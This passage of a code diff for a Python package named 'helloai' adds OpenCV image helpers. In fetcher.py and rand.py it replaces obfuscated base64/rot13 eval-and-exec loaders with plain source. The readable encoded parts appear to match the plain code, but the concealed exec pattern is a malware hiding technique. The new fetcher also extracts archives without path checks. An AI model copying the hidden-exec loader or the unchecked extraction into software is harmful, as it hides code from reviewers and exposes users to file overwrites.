+    hf, wf, cf = imgFront.shape
+    hb, wb, cb = imgBack.shape
+    *_, mask = cv2.split(imgFront)
+    maskBGRA = cv2.cvtColor(mask, cv2.COLOR_GRAY2BGRA)
+    maskBGR = cv2.cvtColor(mask, cv2.COLOR_GRAY2BGR)
+    imgRGBA = cv2.bitwise_and(imgFront, maskBGRA)
+    imgRGB = cv2.cvtColor(imgRGBA, cv2.COLOR_BGRA2BGR)
+
+    imgMaskFull = np.zeros((hb, wb, cb), np.uint8)
+    imgMaskFull[pos[1]:hf + pos[1], pos[0]:wf + pos[0], :] = imgRGB
+    imgMaskFull2 = np.ones((hb, wb, cb), np.uint8) * 255
+    maskBGRInv = cv2.bitwise_not(maskBGR)
+    imgMaskFull2[pos[1]:hf + pos[1], pos[0]:wf + pos[0], :] = maskBGRInv
+
+    imgBack = cv2.bitwise_and(imgBack, imgMaskFull2)
+    imgBack = cv2.bitwise_or(imgBack, imgMaskFull)
+
+    return imgBack
+
+
+def rotateImage(img, angle, scale=1):
+    h, w = img.shape[:2]
+    center = (w / 2, h / 2)
+    rotate_matrix = cv2.getRotationMatrix2D(center=center, angle=angle, scale=scale)
+    img = cv2.warpAffine(src=img, M=rotate_matrix, dsize=(w, h))
+    return img
+
+
+def putTextRect(img, text, pos, scale=3, thickness=3, colorT=(255, 255, 255),
+                colorR=(255, 0, 255), font=cv2.FONT_HERSHEY_PLAIN,
+                offset=10, border=None, colorB=(0, 255, 0)):
+    """
+    Creates Text with Rectangle Background
+    :param img: Image to put text rect on
+    :param text: Text inside the rect
+    :param pos: Starting position of the rect x1,y1
+    :param scale: Scale of the text
+    :param thickness: Thickness of the text
+    :param colorT: Color of the Text
+    :param colorR: Color of the Rectangle
+    :param font: Font used. Must be cv2.FONT....
+    :param offset: Clearance around the text
+    :param border: Outline around the rect
+    :param colorB: Color of the outline
+    :return: image, rect (x1,y1,x2,y2)
+    """
+    ox, oy = pos
+    (w, h), _ = cv2.getTextSize(text, font, scale, thickness)
+
+    x1, y1, x2, y2 = ox - offset, oy + offset, ox + w + offset, oy - h - offset
+
+    cv2.rectangle(img, (x1, y1), (x2, y2), colorR, cv2.FILLED)
+    if border is not None:
+        cv2.rectangle(img, (x1, y1), (x2, y2), colorB, border)
+    cv2.putText(img, text, (ox, oy), font, scale, colorT, thickness)
+
+    return img, [x1, y2, x2, y1]
+
+
+def main():
+    cap = cv2.VideoCapture(0)
+    while True:
+        success, img = cap.read()
+        img, bbox = putTextRect(img, "CVZone", [50, 50], 2, 2, offset=10, border=5)
+        imgGray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        imgList = [img, img, imgGray, img, imgGray]
+        imgStacked = stackImages(imgList, 2, 0.5)
+
+        cv2.imshow("stackedImg", imgStacked)
+        cv2.waitKey(1)
+
+
+if __name__ == "__main__":
+    main()
```

## helloai/utils/fetcher.py

```diff
@@ -1,8 +1,100 @@
-import base64, codecs
-magic = 'DQoNCmltcG9ydCBvcw0KaW1wb3J0IHV1aWQNCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4NCmltcG9ydCB0ZW1wZmlsZQ0KZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlDQpmcm9tIHNodXRpbCBpbXBvcnQgdW5wYWNrX2FyY2hpdmUNCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZQ0KZnJvbSByYW5kb21fd29yZCBpbXBvcnQgUmFuZG9tV29yZHMNCmltcG9ydCB6aXBmaWxlDQpmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUNCmltcG9ydCBnemlwDQppbXBvcnQgdGFyZmlsZQ0KaW1wb3J0IHJlcXVlc3RzDQoNCg0KX19hbGxfXyA9IFsnZmV0Y2gnLCAndW56aXAnLCAnZmV0Y2hfYW5kX3VuemlwJ10NCg0KDQpkZWYgZmV0Y2godXJsLCBmb2xkZXI9Tm9uZSwgZmlsZV9uYW1lPU5vbmUpOg0KICAgIA0KICAgIGlmIG5vdCBmb2xkZXI6DQogICAgICAgICMgVGVtcCBmb2xkZXINCiAgICAgICAgZm9sZGVyID0gdGVtcGZpbGUuZ2V0dGVtcGRpcigpDQogICAgICAgICMgcHJpbnQoJ2ZvbGRlcjogJywgZm9sZGVyKQ0KDQogICAgIyDtj7TrjZTqsIAg7JeG7Jy866m0IOunjOuTpOqzoCwg7J6I7Jy866m0IOyViCDrp4zrk6Dri6QuDQogICAgb3MubWFrZWRpcnMoZm9sZGVyLCBleGlzdF9vaz1UcnVlKQ0KDQogICAgIyDtjIzsi7ENCiAgICBwYXJ0cyA9IHVybHBhcnNlKHVybCkNCiAgICAjIHByaW50KHBhcnRzKQ0KDQogICAgaWYgbm90IGZpbGVfbmFtZToNCiAgICAgICAgIyDtmZXsnqXsnpAg7LC+6riwIA0KICAgICAgICBmaWxlX2V4dCA9IG9zLnBhdGguc3BsaXRleHQocGFydHMucGF0aClbMV0g'
-love = 'VPNAPvNtVPNtVPNtVlOjpzyhqPtaMKu0MJ5mnJ9hVQbtWljtMzyfMI9yrUDfVUE5pTHbMzyfMI9yrUDcYPOfMJ4bMzyfMI9yrUDcXD0XQDbtVPNtVPNtVTMcoTIsozSgMFN9VT9mYaOuqTthLzSmMJ5uoJHbpTSlqUZhpTS0nPxtVPAyMUAspzIjo3W0YzAmqt0XVPNtVPNtVPNwVUOlnJ50XPqznJkyK25uoJHtBvNaYPOznJkyK25uoJHfVUE5pTHbMzyfMI9hLJ1yXFjtoTIhXTMcoTIsozSgMFxcQDbtVPNtVPNtVN0XVPNtVPNtVPOcMvOho3DtMzyfMI9hLJ1yBt0XVPNtVPNtVPNtVPNtVlQfabGfv5jt7LlZ7W287W2RVBhawBhGbBhYcP4APvNtVPNtVPNtVPNtVTMcoTIsozSgMFN9VUA0pvu1qJyxYaI1nJD0XPxcYaAjoTy0XPpgWlyoZS0tXlNaYaEgpPpAPvNtVPNtVPNtVPNtVPZtpUWcoaDbW3EyoKNtMzyfMJ5uoJHtBvNaYPO0rKOyXTMcoTIsozSgMFxfVTMcoTIsozSgMFxAPvNtVPNtVPNtQDbtVPNtVPNtVPZt7MzI7W6y7W6D6ePNVBlrvBhYcBhXyPQdfbCfaLNt7LlZ7W2866dS7W20VBlrvBhYcBhXyPQdfbCfaYmebMjt6ePR7XB8VN0XVPNtVPNtVPNwVTyzVTMcoTIsMKu0VTyhVPtaYzq6WljtWl56nKNaYPNaM3ccpPpfVPqvrzyjZvpfVPqfrz1uWlx6QDbtVPNtVPNtVPZtVPNtVT5uoJImVQ0tpTSlqUZhpTS0nP5mpTkcqPtaYlpcQDbtVPNtVPNtVPZtVPNtVTMcoTIsozSgMFN9VT5uoJImJl0kKD0XVPNtVPNtVPNwVPNtVPOjpzyhqPtaMzyfMJ5uoJHtBvNaYPOznJkyK25uoJHcQDbtVPNtVPNtVPZtMJkmMGbAPvNtVPNtVPNtVlNtVPNtVlQfabGfv5jt7LlZ7W287W2RVBhawBhGbBhYcP4APvNtVPNtVPNtVlNtVPNtVlOznJkyK25uoJHtCFO1qJyx'
-god = 'LnV1aWQ0KCkuc3BsaXQoJy0nKVswXQ0KICAgICAgICAjICAgICBmaWxlX25hbWUgPSBzdHIodXVpZC51dWlkNCgpKS5zcGxpdCgnLScpWzBdICsgJy50bXAnDQogICAgICAgICMgICAgIHByaW50KCd0ZW1wIHdvcmQgZmlsZW5hbWUgOiAnLCB0eXBlKGZpbGVfbmFtZSksIGZpbGVfbmFtZSkNCg0KICAgICMgcHJpbnQoJ2Rvd25sb2FkIGF0ICcsIG9zLnBhdGguam9pbihmb2xkZXIsIGZpbGVfbmFtZSkpDQogICAgDQogICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihmb2xkZXIsIGZpbGVfbmFtZSksICd3YicpIGFzIG15X2ZpbGU6DQogICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQodXJsKQ0KICAgICAgICBteV9maWxlLndyaXRlKGRhdGEuY29udGVudCkNCiAgICAgICAgcmV0dXJuIG9zLnBhdGguam9pbihmb2xkZXIsIGZpbGVfbmFtZSkNCiAgICAgICAgDQogICAgcmV0dXJuIE5vbmUNCg0KDQpkZWYgdW56aXAocGF0aCk6DQogICAgcGF0aF90b196aXBfZmlsZSA9IHBhdGgNCiAgICBkaXJlY3RvcnlfdG9fZXh0cmFjdF90byA9IG9zLnBhdGguZGlybmFtZShwYXRoX3RvX3ppcF9maWxlKQ0KDQogICAgIyBwcmludCgndW56aXAgZmlsZTonLCBwYXRoX3RvX3ppcF9maWxlKQ0KICAgICMgcHJpbnQoJ3VuemlwIGZvbGRlcjonLCBkaXJlY3RvcnlfdG9fZXh0cmFjdF90bykNCiAgICANCiAgICAjIO2ZleyepeyekCDssL7quLAgDQogICAgZmlsZV9leHQgPSBvcy5wYXRoLnNwbGl0ZXh0KHBhdGhfdG9femlwX2ZpbGUpWzFdDQogICAgIyBwcmludCgnZXh0ZW5zaW9uIDogJywgZmlsZV9leHQsIHR5cGUoZmlsZV9leHQpLCBsZW4oZmlsZV9leHQpKQ0K'
-destiny = 'VPNtVN0XVPNtVN0XVPNtVN0XVPNtVTyzVTMcoTIsMKu0VTyhVPtaYzq6WljtWl5arzyjWljtWl5vrzyjZvpfVPphoUcgLFpcBt0XVPNtVPNtVPO0LKVtCFO0LKWznJkyYz9jMJ4bpTS0nS90o196nKOsMzyfMFjtoJ9xMG0apwbdWlxAPvNtVPNtVPNtMTylK25uoJHtCFO0LKVhM2I0oJIgLzIlpltcJmOqYz5uoJHhp3OfnKDbWl8aXIfjKD0XVPNtVPNtVPNwVUOlnJ50XPqxnKVtozSgMGbtWljtMTylK25uoJHcQDbAPvNtVPNtVPNtqTSlYzI4qUWuL3EuoTjbpTS0nQ1xnKWyL3EipaysqT9sMKu0pzSwqS90olxAPvNtVPNtVPNtqTSlYzAfo3AyXPxAPvNtVPNtVPNtpzI0qKWhVT9mYaOuqTthnz9covuxnKWyL3EipaysqT9sMKu0pzSwqS90oljtMTylK25uoJHcQDbtVPNtMJkcMvOznJkyK2I4qPOcovNbWl56nKNaYPx6QDbtVPNtVPNtVUqcqTttJzyjEzyfMFujLKEbK3EiK3ccpS9znJkyYPNapvpcVTSmVUccpR9vnwbAPvNtVPNtVPNtVPNtVTEcpy9hLJ1yVQ0trzyjG2WdYz5uoJIfnKA0XPyoZS0hp3OfnKDbWl8aXIfjKD0XVPNtVPNtVPNtVPNtVlOjpzyhqPtaMTylVT5uoJH6VPpfVTEcpy9hLJ1yXD0XVPNtVPNtVPNtVPNtrzyjG2WdYzI4qUWuL3EuoTjbpTS0nQ1xnKWyL3EipaysqT9sMKu0pzSwqS90olxAPvNtVPNtVPNtVPNtVUWyqUIlovOipl5jLKEbYzcinJ4bMTylMJA0o3W5K3EiK2I4qUWuL3EsqT8fVTEcpy9hLJ1yXD0XVPNtVUWyqUIlovOBo25yQDbAPzEyMvOzMKEwnS9uozEsqJ56nKNbqKWfYPOzo2kxMKV9Gz9hMFjtMzyfMI9hLJ1yCH5iozHcBt0XVPNtVUWyqUIlovO1oaccpPuzMKEwnPu1pzjfVTMioTEypvjtMzyfMI9hLJ1yXFxAPt0X'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+
+
+import os
+import uuid
+from urllib.request import urlopen
+import tempfile
+from tempfile import NamedTemporaryFile
+from shutil import unpack_archive
+from urllib.parse import urlparse
+from random_word import RandomWords
+import zipfile
+from zipfile import ZipFile
+import gzip
+import tarfile
+import requests
+
+
+__all__ = ['fetch', 'unzip', 'fetch_and_unzip']
+
+
+def fetch(url, folder=None, file_name=None):
+    
+    if not folder:
+        # Temp folder
+        folder = tempfile.gettempdir()
+        # print('folder: ', folder)
+
+    # 폴더가 없으면 만들고, 있으면 안 만든다.
+    os.makedirs(folder, exist_ok=True)
+
+    # 파싱
+    parts = urlparse(url)
+    # print(parts)
+
+    if not file_name:
+        # 확장자 찾기 
+        file_ext = os.path.splitext(parts.path)[1]   
+        # print('extension : ', file_ext, type(file_ext), len(file_ext))
+
+        file_name = os.path.basename(parts.path)  #eds_report.csv
+        # print('file_name : ', file_name, type(file_name), len(file_name))
+        
+        if not file_name:
+            # 임시 파일을 만든다.
+            file_name = str(uuid.uuid4()).split('-')[0] + '.tmp'
+            # print('temp filename : ', type(file_name), file_name)
+        
+        # 확장자가 있다는 것은 파일명이 있다는 것으로 간주 
+        # if file_ext in ('.gz', '.zip', 'gzip', 'bzip2', 'lzma'):
+        #     names = parts.path.split('/')
+        #     file_name = names[-1]
+        #     print('filename : ', file_name)
+        # else:
+        #     # 임시 파일을 만든다.
+        #     # file_name = uuid.uuid4().split('-')[0]
+        #     file_name = str(uuid.uuid4()).split('-')[0] + '.tmp'
+        #     print('temp word filename : ', type(file_name), file_name)
+
+    # print('download at ', os.path.join(folder, file_name))
+    
+    with open(os.path.join(folder, file_name), 'wb') as my_file:
+        data = requests.get(url)
+        my_file.write(data.content)
+        return os.path.join(folder, file_name)
+        
+    return None
+
+
+def unzip(path):
+    path_to_zip_file = path
+    directory_to_extract_to = os.path.dirname(path_to_zip_file)
+
+    # print('unzip file:', path_to_zip_file)
+    # print('unzip folder:', directory_to_extract_to)
+    
+    # 확장자 찾기 
+    file_ext = os.path.splitext(path_to_zip_file)[1]
+    # print('extension : ', file_ext, type(file_ext), len(file_ext))
+    
+    
+    
+    if file_ext in ('.gz', '.gzip', '.bzip2', '.lzma'):
+        tar = tarfile.open(path_to_zip_file, mode='r:*')
+        dir_name = tar.getmembers()[0].name.split('/')[0]
+        # print('dir name: ', dir_name)
+
+        tar.extractall(path=directory_to_extract_to)
+        tar.close()
+        return os.path.join(directory_to_extract_to, dir_name)
+    elif file_ext in ('.zip',):
+        with ZipFile(path_to_zip_file, 'r') as zipObj:
+            dir_name = zipObj.namelist()[0].split('/')[0]
+            # print('dir name: ', dir_name)
+            zipObj.extractall(path=directory_to_extract_to)
+            return os.path.join(directory_to_extract_to, dir_name)
+    return None
+
+def fetch_and_unzip(url, folder=None, file_name=None):
+    return unzip(fetch(url, folder, file_name))
+
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## helloai/utils/rand.py

```diff
@@ -1,8 +1,273 @@
-import base64, codecs
-magic = 'IwojIFBhcnQgb2YgcDU6IEEgUHl0aG9uIHBhY2thZ2UgYmFzZWQgb24gUHJvY2Vzc2luZwojIENvcHlyaWdodCAoQykgMjAxNy0yMDE5IEFiaGlrIFBhbAojCiMgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKIyBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQojIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yCiMgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KIwojIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLCBidXQKIyBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mCiMgTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiBTZWUgdGhlIEdOVQojIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4KIwojIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlCiMgYWxvbmcgd2l0aCB0aGlzIHByb2dyYW0uIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4KIwoKaW1wb3J0IHJhbmRvbSBhcyByYW5kCmltcG9ydCBudW1weSBhcyBucAoKZnJvbSAudXRpbHMgaW1wb3J0IGNvbnN0cmFpbgpmcm9tIC51dGlscyBpbXBvcnQgU0lOQ09TX0xFTkdUSApmcm9tIC51dGlscyBpbXBvcnQgUFJFX0NPUwoKX19hbGxfXyA9IFsKICAgICMgUEVSTElOIE5PSVNFIEZVTkNUSU9OUwogICAgJ25vaXNlJywgJ25vaXNlX2RldGFpbCcsICdub2lzZV9zZWVkJywKCiAgICAjIFJBTkRPTSBOVU1CRVIgR0VORVJBVElPTgogICAgJ3JhbmRvbScsICdyYW5kb21fdW5pZm9ybScsICdyYW5kb21fZ2F1c3NpYW4nLCAncmFuZG9tX3NlZWQnLCAncmFuZG9tX3JhbmdlJwpdCgojIE1vc3Qgb2YgdGhlIHBlcmxpbiBub2lzZSBjb2RlIGlzIGJhc2VkIG9uIHRoZSBvcmlnaW5hbCBQcm9jZXNzaW5nCiMgaW1wbGVtZW50YXRpb24gb2YgdGhlIG5vaXNlIGZ1bmN0aW9uLiB0b3hpICgrIG90aGVyIGZvbGtzKSBwdXQgYQojIGJ1bmNoIG9mIGNvbW1lbnRzIG9uIHRoZSBQcm9jZXNzaW5nIHZlcnNpb24sIGFuZCBJJ3ZlIGFkZGVkIHRoZW0KIyBoZXJlIHRvbyBmb3IgY29udGV4dC4KIwojIEFsbCBjb21tZXRzIHRoYXQgd2VyZSBwb3J0ZWQgZnJvbSBQcm9jZXNzaW5nIGFyZSBwcmVmaXhlZCB3aXRoCiMgIiNQOiIKIwojICAgICAgICAgLS0tIGFiaGlrcGFsICgyMDE3LTA4LTA0KQoKIyBQOiBQRVJMSU4gTk9JU0UKIyBQOgojIFA6IFt0b3hpIDA0MDkwM10KIyBQOiBvY3RhdmVzIGFuZCBhbXBsaXR1ZGUgYW1vdW50IHBlciBvY3RhdmUgYXJlIG5vdyB1c2VyIGNvbnRyb2xsZWQgdmlhCiMgUDogdGhlIG5vaXNlRGV0YWlsKCkgZnVuY3Rpb24uCiMgUDoKIyBQOiBbdG94aSAwMzA5MDJdCiMgUDogY2xlYW5lZCB1cCBjb2RlIGFuZCBub3cgdXNpbmcgYmFnZWwncyBjb3NpbmUgdGFibGUgdG8gc3BlZWQgdXAKIyBQOgojIFA6IFt0b3hpIDAzMDkwMV0KIyBQOiBpbXBsZW1lbnRhdGlvbiBieSB0aGUgZ2VybWFuIGRlbW8gZ3JvdXAgZmFyYnJhdXNjaCBhcyB1c2VkIGluI'
-love = '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'
-god = 'BpbnQoeGkgKyAoeWkgPDwgUEVSTElOX1lXUkFQQikgKyAoemkgPDwgUEVSTElOX1pXUkFQQikpCiAgICAgICAgbjEgPSBQRVJMSU5bb2YgJSBQRVJMSU5fU0laRV0KICAgICAgICBuMSArPSByeGYgKiAoUEVSTElOWyhvZiArIDEpICUgUEVSTElOX1NJWkVdIC0gbjEpCiAgICAgICAgbjIgPSBQRVJMSU5bKG9mICsgUEVSTElOX1lXUkFQKSAlIFBFUkxJTl9TSVpFXQogICAgICAgIG4yICs9IHJ4ZiAqIChQRVJMSU5bKG9mICsgUEVSTElOX1lXUkFQICsgMSkgJiBQRVJMSU5fU0laRV0gLSBuMikKICAgICAgICBuMSArPSByeWYgKiAobjIgLSBuMSkKCiAgICAgICAgb2YgKz0gUEVSTElOX1pXUkFQCiAgICAgICAgbjIgPSBQRVJMSU5bb2YgJiBQRVJMSU5fU0laRV0KICAgICAgICBuMiArPSByeGYgKiAoUEVSTElOWyhvZiArIDEpICUgUEVSTElOX1NJWkVdIC0gbjIpCiAgICAgICAgbjMgPSBQRVJMSU5bKG9mICsgUEVSTElOX1lXUkFQKSAlIFBFUkxJTl9TSVpFXQogICAgICAgIG4zICs9IHJ4ZiAqIChQRVJMSU5bKG9mICsgUEVSTElOX1lXUkFQICsgMSkgJSBQRVJMSU5fU0laRV0gLSBuMykKCiAgICAgICAgbjIgKz0gcnlmICogKG4zIC0gbjIpCiAgICAgICAgbjEgKz0gbm9pc2VfZnNjKHpmKSAqIChuMiAtIG4xKQoKICAgICAgICByICs9IG4xICogYW1wbAogICAgICAgIGFtcGwgKj0gUEVSTElOX0ZBTExPRkYKCiAgICAgICAgeGkgKj0gMgogICAgICAgIHhmICo9IDIKCiAgICAgICAgeWkgKj0gMgogICAgICAgIHlmICo9IDIKCiAgICAgICAgemkgKj0gMgogICAgICAgIHpmICo9IDIKCiAgICAgICAgaWYgeGYgPj0gMToKICAgICAgICAgICAgeGkgPSB4aSArIDEKICAgICAgICAgICAgeGYgPSB4ZiAtIDEKCiAgICAgICAgaWYgeWYgPj0gMToKICAgICAgICAgICAgeWkgPSB5aSArIDEKICAgICAgICAgICAgeWYgPSB5ZiAtIDEKCiAgICAgICAgaWYgemYgPj0gMToKICAgICAgICAgICAgemkgPSB6aSArIDEKICAgICAgICAgICAgemYgPSB6ZiAtIDEKCiAgICByZXR1cm4gcgoKCmRlZiBub2lzZV9kZXRhaWwob2N0YXZlcz00LCBmYWxsb2ZmPTAuNSk6CiAgICAiIiJBZGp1c3QgdGhlIGxldmVsIG9mIG5vaXNlIGRldGFpbCBwcm9kdWNlZCBieSBub2lzZSgpLgoKICAgIDpwYXJhbSBvY3RhdmVzOiBUaGUgbnVtYmVyIG9mIG9jdGF2ZXMgdG8gY29tcHV0ZSB0aGUgbm9pc2UgZm9yCiAgICAgICAgKGRlZmF1bHRzIHRvIDQpLgogICAgOnR5cGUgb2N0YXZlczogaW50CgogICAgOnBhcmFtIGZhbGxvZmY6CiAgICA6dHlwZSBmYWxsb2ZmOiBmbG9hdAoKICAgIDpub3RlOiBGb3IgOmNvZGU6YGZhbGxvZmZgIHZhbHVlcyBncmVhdGVyIHRoYW4gMC41LAogICAgICAgIDpjb2RlOmBub2lzZSgpYCB3aWxsIHJldHVybiB2YWx1ZXMgZ3JlYXRlciB0aGFuIDEuMC4KCiAgICAiIiIKICAgIGdsb2JhbCBQRVJMSU5fT0NUQVZFUwogICAgZ2xvYmFsIFBFUkxJTl9GQUxMT0ZGCgogICAgaWYgb2N0YXZlcyA+IDA6CiAgICAgICAgUEVSTElOX09DVEFWRVMgPSBvY3RhdmVzCiAgICBQRVJMSU5fRkFMTE9GRiA9IGNvbnN0cmFpbihmYWxsb2ZmLCAwLCAxKQoKCmRlZiBub2lzZV9zZWVkKHNlZWQpOgogICAgIiIiU2V0IHRoZSBzZWVkIHZhbHVlIGZvciA6Y29kZTpgbm9pc2UoKWAKCiAgICBCeSBkZWZhdWx0IDpjb2RlOmBub2lzZSgpYCBwcm9kdWVzIGRpZmZlcmVudCB2YWx1ZXMgZWFjaCB0aW1lIHRoZQogICAgc2tldGNoIGlzIHJ1bi4gU2V0dGluZyB0aGUgOmN'
-destiny = 'iMTH6LUAyMJEtVUOupzSgMKEypvO0olOuVTAioaA0LJ50PvNtVPO3nJkfVT1un2HtBzAiMTH6LT5inKAyXPytVUWyqUIlovO0nTHtp2SgMFO2LJk1MKZtMJSwnPO0nJ1yVUEbMDbtVPNtp2gyqTAbVTymVUW1ov4XPvNtVPN6pTSlLJ0tp2IyMQbtITuyVUWypKIcpzIxVUAyMJDtqzSfqJHhPvNtVPN6qUyjMFOmMJIxBvOcoaDXPvNtVPNvVvVXVPNtVTqfo2WuoPODEIWZFH4XVPNtVUWuozEioI9mMJIxXUAyMJDcPvNtVPODEIWZFH4tCFOBo25yPtbXMTIzVUWuozEioI91ozyzo3WgXTucM2t9ZFjtoT93CGNcBtbtVPNtVvVvHzI0qKWhVTRtqJ5cMz9loJk5VUAuoKOfMJDtpzShMT9gVT51oJWypv4XPvNtVPN6pTSlLJ0tnTyanQbtITuyVUIjpTIlVTkcoJy0VT9hVUEbMFOlLJ5xo20tqzSfqJHtXTEyMzS1oUEmVUEiVQRcYtbtVPNtBaE5pTHtnTyanQbtMzkiLKDXPvNtVPN6pTSlLJ0toT93BvOHnTHtoT93MFOfnJ1cqPOiovO0nTHtpzShMT9gVUMuoUIyVPuxMJMuqJk0plO0olNjXF4XVPNtVQc0rKOyVTkiqmbtMzkiLKDXPvNtVPN6pzI0qKWhpmbtDFOlLJ5xo20toaIgLzIlVTWyqUqyMJ4tBzAiMTH6LTkiq2NtLJ5xVQcwo2EyBzObnJqbLP4XVPNtVQclqUyjMGbtMzkiLKDXPvNtVPNvVvVXVPNtVUWyqUIlovOlLJ5xYaIhnJMipz0boT93YPObnJqbXDbXPzEyMvOlLJ5xo21sM2S1p3AcLJ4boJIuow0jYPOmqTEsMTI2CGRcBtbtVPNtVvVvHzI0q